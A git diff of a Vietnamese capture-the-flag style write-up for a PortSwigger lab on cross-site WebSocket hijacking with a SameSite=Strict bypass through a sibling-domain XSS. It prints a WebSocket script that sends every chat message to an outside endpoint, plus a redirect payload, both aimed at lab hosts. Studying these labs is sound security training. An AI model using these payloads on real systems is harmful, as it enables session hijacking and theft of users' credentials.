@@ -97,7 +97,7 @@ WebSocket không kiểm tra Origin hoặc CSRF token.
 Trình duyệt gửi cookie tự động trong kết nối WebSocket → cho phép trang bên ngoài "hijack" session hiện tại.
 
 🧪 **Lab: SameSite Strict bypass via sibling domain**
-
+🔗 **Lab URL: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain**
 🧠 **Mục tiêu**
 
 Khai thác lỗ hổng Cross-site WebSocket Hijacking (CSWSH) và vượt qua cơ chế bảo vệ SameSite=Strict bằng cách sử dụng XSS từ domain anh em (cms-...) để đánh cắp lịch sử chat chứa thông tin đăng nhập nạn nhân.
@@ -132,6 +132,7 @@ Gửi payload:
 📡 **Bước 2: Viết script tấn công WebSocket**
 
 <script>
+    
     var ws = new WebSocket('wss://<your-lab-id>.web-security-academy.net/chat');
     ws.onopen = function() {
         ws.send("READY");
@@ -143,13 +144,17 @@ Gửi payload:
             body: event.data
         });
     };
+    
 </script>
+
 URL-encode toàn bộ script trên → dán vào URL cms-.../login?username=....
 
 Tạo script chuyển hướng người dùng sang URL XSS:
 
 <script>
+    
     document.location = "https://cms-<lab-id>.web-security-academy.net/login?username=<payload-encoded>&password=anything";
+    
 </script>
 
 ![image](https://github.com/user-attachments/assets/22dcb625-d9e4-491d-be1e-8ff3a50f943f)
